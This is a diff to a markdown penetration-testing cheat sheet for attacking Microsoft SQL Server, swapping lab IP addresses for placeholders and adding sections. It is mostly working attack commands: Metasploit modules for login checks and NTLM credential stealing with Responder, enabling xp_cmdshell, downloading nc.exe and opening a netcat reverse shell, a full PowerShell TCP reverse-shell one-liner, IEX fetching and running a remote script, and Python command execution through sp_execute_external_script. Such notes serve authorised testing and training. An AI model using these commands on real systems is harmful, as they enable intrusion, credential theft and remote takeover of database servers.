@@ -6,13 +6,18 @@
 nmap --script ms-sql-info,ms-sql-empty-password,ms-sql-xp-cmdshell,ms-sql-config,ms-sql-ntlm-info,ms-sql-tables,ms-sql-hasdbaccess,ms-sql-dac,ms-sql-dump-hashes --script-args mssql.instance-port=1433,mssql.username=sa,mssql.password=,mssql.instance-name=MSSQLSERVER -sV -p 1433 IP
 ```
 
+## msf modules
+* Login check: `use auxiliary/scanner/mssql/mssql_login`
+* Steal NTLM-creds: `use auxiliary/admin/mssql/mssql_ntlm_stealer`
+  * Start responder: `sudo responder -I tun0`
+
 ## [mssqlclient.py](https://github.com/SecureAuthCorp/impacket)
 
 ```bash
 mssqlclient.py DOMAIN/USER:PASS@$IP [-port <>] [-windows-auth]
 ```
 
-## xp_cmdshell
+## Privilege checks
 
 ```bash
 # to see if we are sysadmin
@@ -20,8 +25,13 @@ mssqlclient.py DOMAIN/USER:PASS@$IP [-port <>] [-windows-auth]
 SELECT IS_SRVROLEMEMBER ('sysadmin')
 SELECT IS_SRVROLEMEMBER('sysadmin', 'sa')
 SELECT name FROM master..syslogins WHERE sysadmin = '1'
+```
 
-# xp_cmdshell for reverse shell
+## EXEC
+
+### xp_cmdshell
+
+```bash
 EXEC sp_configure 'Show Advanced Options', 1;
 RECONFIGURE;
 EXEC sp_configure 'xp_cmdshell', 1;
@@ -29,12 +39,17 @@ RECONFIGURE;
 EXEC xp_cmdshell "whoami";
 
 # shells
-EXEC xp_cmdshell "powershell -c (New-Object System.Net.WebClient).DownloadFile('http://10.10.14.34/nc.exe','c:\users\public\nc.exe');"
-EXEC xp_cmdshell "c:\users\public\nc.exe -e cmd.exe 10.10.14.34 6969"
+EXEC xp_cmdshell "powershell -c (New-Object System.Net.WebClient).DownloadFile('http://IP/nc.exe','c:\Users\Public\nc.exe');"
+EXEC xp_cmdshell "c:\Users\Public\nc.exe -e cmd.exe IP PORT"
 [OR]
-# shell.ps1
-$client = New-Object System.Net.Sockets.TCPClient("10.10.14.3",443);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + "# ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()
-EXEC xp_cmdshell "powershell IEX (New-Object Net.WebClient).DownloadString('http://10.10.14.34/shell.ps1');"
+$client = New-Object System.Net.Sockets.TCPClient("IP",PORT);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + "# ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()
+EXEC xp_cmdshell "powershell IEX (New-Object Net.WebClient).DownloadString('http://IP/shell.ps1');"
+```
+
+### external_scripts
+
+```bash
+EXECUTE sp_execute_external_script @language = N'Python', @script = N'print(__import__("os").system("whoami"))'
 ```
 
 ## ms-sql commands
@@ -88,7 +103,7 @@ SELECT <DB>..syscolumns.name, TYPE_NAME(<DB>..syscolumns.xtype) FROM <DB>..sysco
 SELECT TOP 1 name FROM (SELECT TOP 9 name FROM master..syslogins ORDER BY name ASC) ORDER BY name DESC
 ```
 
-## Config File Paths
+## Database File Paths
 
 * [practicalsbs.wordpress.com/sql-server-file-locations-for-default-instances/](https://practicalsbs.wordpress.com/2016/07/03/sql-server-file-locations-for-default-instances/)
 
